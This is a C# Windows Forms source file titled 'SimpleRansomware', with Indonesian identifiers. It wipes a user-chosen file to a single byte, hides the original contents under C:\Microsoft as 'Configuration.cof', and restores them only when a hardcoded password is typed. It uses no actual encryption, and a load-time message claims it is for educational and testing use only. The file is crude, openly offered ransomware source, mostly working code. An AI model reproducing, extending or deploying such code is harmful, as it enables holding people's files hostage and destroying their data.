using System.Security.Cryptography;
using System.Text;
using System;
using System.IO;
using System.Diagnostics.Eventing.Reader;
using Microsoft.VisualBasic;

namespace SimpleRansomware
{
    public partial class Form1 : Form
    {

        public byte[] lol;

        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBox1.Text))
            {
                MessageBox.Show("Please type the file directory first!", "System", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                DialogResult enkripsi = MessageBox.Show("Do you want to encrypt this file?", "System", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (enkripsi == DialogResult.Yes)
                {
                    byte[] contents = { 0 };
                    lol = File.ReadAllBytes(textBox1.Text);
                    File.WriteAllBytes(textBox1.Text, contents);
                    string filePath = @"C:\Microsoft\Configuration.cof";
                    string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
                    string extension = Path.GetExtension(filePath);
                    // Cek keberadaan files
                    int fileCount = 1;
                    while (File.Exists(filePath))
                    {
                        filePath = Path.Combine(Path.GetDirectoryName(filePath), $"{fileNameWithoutExtension}_{fileCount}{extension}");
                        fileCount++;
                    }
                    File.WriteAllBytes(filePath, lol);
                }
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            string code = textBox2.Text;
            string password = "yondaktaukoktanyasaya";
            if (code == password)
            {
                DialogResult dekripsi = MessageBox.Show("HORRAY!!!!! The key is correct. Do you want to decrypt it?", "System", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (dekripsi == DialogResult.Yes)
                {
                    File.WriteAllBytes(textBox1.Text, lol);
                }
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult kamuyakin = MessageBox.Show("Are you sure you want to quit from this app? You may lose the data you have encrypted after you exit this app if you do not decrypt it immediately.", "System", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (kamuyakin == DialogResult.Yes)
            {
                Application.ExitThread();
            }
            else
            {
                e.Cancel = true;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("Attention. Use this app wisely. This application is made for educational and testing purposes only. Never use this app for pranks and crime. The creator of this app is not responsible for any damage to the device that occurs due to this app.", "System", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    }
}